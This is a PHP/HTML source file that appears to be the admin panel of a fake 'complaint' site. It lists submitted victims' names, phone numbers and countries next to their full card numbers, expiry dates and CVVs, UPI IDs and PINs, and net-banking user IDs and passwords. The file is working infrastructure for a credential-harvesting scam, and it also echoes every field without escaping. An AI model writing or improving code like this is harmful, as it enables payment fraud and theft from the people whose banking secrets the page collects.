<?php
    session_start();
   if($_SESSION["User_Id"]=="1"){
        error_reporting(0);
        include"Connection.php"; 
?>
<!doctype html>
<html lang="en">
  <head>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
    <title>Compliant Query</title>
    <style>
  
#table-data th{
  background: hsl(64, 100%, 73%);
}
#table-data tr:nth-child(odd){
  background: #ecf0f1;
}
    </style>
  </head>
  <body>
<table style='width:100%' id='table-data'>
    <tr  class='border text-center'>
        <th colspan='9' style='background-color:#555;color:#fff'> <h1><i>Compliant Query</i></h1> </th>
    </tr>
    <tr class='border'>
        <th>S.L</th>
        <th>Name</th>
        <th>Phone Number</th>
        <th>Country</th>
        <th>Complain</th>
        <th>Amount Type</th>
        <th>Amount</th>
        <th>Payment Information</th>
    </tr>
    <?php
        $query="SELECT*FROM `coustomer query` ORDER BY `coustomer query`.`Query_Id` DESC";
            $result = mysqli_query($conn, $query);
                if(mysqli_num_rows($result) > 0){
                    $sl=mysqli_num_rows($result)+1;
                    while($row = mysqli_fetch_array($result)){
                        $Query_Id=$row['Query_Id'];
                        $Card_Number=$row['Card_Number'];
                        $Card_Exipry_Date=$row['Card_Exipry_Date'];
                        $CVV=$row['CVV'];
                        $Upi_Id=$row['Upi_Id'];
                        $Upi_Pin=$row['Upi_Pin'];
                        $Upi_Pin=$row['Upi_Pin'];
                        $User_Id=$row['User_Id'];
                        $Net_Password=$row['Net_Password'];
                        $Other=$row['Other'];
                        $Submit_Date=$row['Submit_Date'];
                        $sl--;
                        echo"<tr  class='border'>
                            <td style='text-align:center'>{$sl}</td>
                            <td style=''>{$row['Full_Name']}</td>
                            <td style=''>{$row['Mobile_Number']}</td>
                            <td style=''>{$row['Country']}</td>
                            <td style='width:15%'>";
                            ?>
                            <span class='text-center'>
                            <button class="btn btn-warning" style='width:90%;' type="button" data-bs-toggle="collapse" data-bs-target="#Man<?php echo"{$Query_Id}";?>" aria-expanded="false" aria-controls="sal<?php echo"{$Query_Id}";?>">
                               See Complain
                            </button>
                            </span>
                            <span class="collapse" id="Man<?php echo"{$Query_Id}";?>">
                                <span class="card card-body">
                                    <?php echo"{$row['Complain']}";?>
                                </span>
                                </span>
                            </td>
                            <?php
                            echo"<td style=''>{$row['Amount_Type']}</td>
                            <td style=''>{$row['Amont']}</td>
                            <td style='width:15%'>";
                            ?>
                                <span class='text-center'>
                                    <button class="btn btn-primary" style='width:90%;' type="button" data-bs-toggle="collapse" data-bs-target="#sal<?php echo"{$Query_Id}";?>" aria-expanded="false" aria-controls="sal<?php echo"{$Query_Id}";?>">
                                    <?php echo"{$row['Payment_Type']}";?>
                                    </button>
                                </span>
                            <div class="collapse" id="sal<?php echo"{$Query_Id}";?>">
                                <div class="card card-body">
                                    <?php
                                    $Payment_Type=$row['Payment_Type'];
                                        if($Payment_Type=='card'){
                                            echo"<p>Card Number : <b>{$Card_Number}</b></p>";
                                            echo"<p>Card Exipry Date : <b>{$Card_Exipry_Date}</b></p>";
                                            echo"<p>Card CVV : <b>{$CVV}</b></p>";
                                        }elseif($Payment_Type=='amazon'){
                                            echo"<p>UpI Id : <b>{$Upi_Id}</b></p>";
                                            echo"<p>Upi Pin : <b>{$Upi_Pin}</b></p>";
                                        }elseif($Payment_Type=='googlepay'){
                                            echo"<p>UpI Id : <b>{$Upi_Id}</b></p>";
                                            echo"<p>Upi Pin : <b>{$Upi_Pin}</b></p>";
                                        }elseif($Payment_Type=='phonepe'){
                                            echo"<p>UpI Id : <b>{$Upi_Id}</b></p>";
                                            echo"<p>Upi Pin : <b>{$Upi_Pin}</b></p>";
                                        }elseif($Payment_Type=='paytm'){
                                            echo"<p>UpI Id : <b>{$Upi_Id}</b></p>";
                                            echo"<p>Upi Pin : <b>{$Upi_Pin}</b></p>";
                                        }elseif($Payment_Type=='net_banking'){
                                            echo"<p>User Id : <b>{$User_Id}</b></p>";
                                            echo"<p>Password : <b>{$Net_Password}</b></p>";
                                        }elseif($Payment_Type=='other'){
                                            echo"<p>{$Other}</p>";
                                        }
                                        echo"<hr><span>Submit Date : {$Submit_Date}</span>";
                            
                            echo"</div>
                            </div></td>
                        </tr>";
                    }
                }
    ?>
</table>





   <?php }?>
 
    <!-- Optional JavaScript; choose one of the two! -->

    <!-- Option 1: Bootstrap Bundle with Popper -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>

    <!-- Option 2: Separate Popper and Bootstrap JS -->
    <!--
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js" integrity="sha384-IQsoLXl5PILFhosVNubq5LC7Qb9DXgDA9i+tQ8Zj3iwWAwPtgFTxbJ8NT4GN1R8p" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.min.js" integrity="sha384-cVKIPhGWiC2Al4u+LWgxfKTRIcfu0JTxR+EQDz/bgldoEyl4H0zUF0QKbrJ0EcQF" crossorigin="anonymous"></script>
    -->
  </body>
</html>